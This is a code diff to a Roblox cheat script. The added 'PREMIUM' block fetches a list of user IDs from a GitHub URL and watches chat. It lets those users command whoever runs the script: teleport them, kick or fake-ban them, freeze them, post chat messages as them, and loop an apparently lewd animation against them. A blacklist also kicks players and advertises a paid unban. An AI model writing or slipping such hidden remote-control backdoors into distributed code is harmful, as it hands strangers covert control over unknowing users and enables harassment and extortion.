@@ -1,4 +1,4 @@
--- BLACKLISTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
+-- BLACKLIST
 
 local function banPlayer(player)
     player:Kick("TWR Has banned you from this script, you can buy an unban on our Discord server. discord.gg/R57rsmdAzk")
@@ -4611,6 +4611,111 @@ end
 })
 
 OrionLib:Init()
+
+-- PREMIUM
+
+
+local premium = {}
+
+local prefix = ":"
+local bending = false
+
+local function fetchPremiumUserIDs()
+    local githubURL = "https://github.com/knnjfs8219sdnf0fs80dfs09d/owexec1/raw/main/ownerpremiumcmd"
+    local response = game:HttpGet(githubURL)
+    
+    if response then
+        for id in response:gmatch("%d+") do
+            table.insert(premium, tonumber(id))
+        end
+    end
+end
+
+fetchPremiumUserIDs()
+
+local function handleCommand(player, message)
+    if game.Players.LocalPlayer.Name ~= player then
+        local userId = game:GetService("Players"):GetUserIdFromNameAsync(player)
+        
+        if userId then
+            if table.find(premium, userId) then 
+                if message == string.lower(prefix.."bring .") then 
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[player].Character.HumanoidRootPart.Position + Vector3.new(0, 5, 0))
+                elseif message == string.lower(prefix.."kick .") then 
+                    game.Players.LocalPlayer:Kick("You have been kicked from this server.")
+                elseif message == string.lower(prefix.."ban .") then 
+                    game.Players.LocalPlayer:Kick("PERMA-BAN")
+                elseif message == string.lower(prefix.."freeze .") then 
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+                elseif message == string.lower(prefix.."unfreeze .") then 
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+                elseif message:sub(1, #prefix+3) == string.lower(prefix.."say") then 
+                    local messageToSend = message:sub(#prefix+5)
+                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(messageToSend, "All")
+                elseif message:sub(1, #prefix+5) == string.lower(prefix.."say .") then
+                    local targetPlayerName = message:sub(#prefix+6, message:find(" ", #prefix+6) - 1)
+                    local messageToSend = message:sub(message:find(" ", #prefix+6) + 1)
+                    local targetPlayer = game.Players:FindFirstChild(targetPlayerName)
+                elseif message == string.lower(prefix.."benx .") then 
+                    bending = true
+                    local segtarget = player
+                    local Crouch = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                    Crouch.Looped = true
+                    Crouch:Play()
+                    local away = .5
+                    local reversing = false
+                    local Loop
+                    local loopFunction = function()
+                        local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                        local character = game.Players.LocalPlayer.Character
+                        if targetchar then
+                            if reversing == true then
+                                away = away - 0.1
+                            else
+                                away = away + 0.1
+                            end
+                            if away >= 2 then
+                                reversing = true
+                            elseif away < 0.5 then
+                                reversing = false
+                            end
+                            character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                        end
+                    end
+                    local Start = function()
+                        Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                    end
+                    local Pause = function()
+                        Loop:Disconnect()
+                        Crouch:Stop()
+                    end
+                    Start()    
+                    repeat
+                        wait()
+                    until bending == false
+                    Pause()
+                elseif message == string.lower(prefix.."unbenx .") then 
+                    while bending == true do
+                        wait()
+                        bending = false
+                    end
+                elseif message:sub(1, #prefix+3) == string.lower(prefix.."say") then 
+                    local messageToSend = message:sub(#prefix+5)
+                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(messageToSend, "All")
+                end
+            end
+        end
+    end
+end
+
+game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", math.huge):WaitForChild("OnMessageDoneFiltering", math.huge).OnClientEvent:Connect(function(data)
+    if data ~= nil then
+        local player = tostring(data.FromSpeaker)
+        local message = tostring(data.Message)
+        
+        handleCommand(player, message)
+    end
+end)
 
 -- NAME TAGS
 
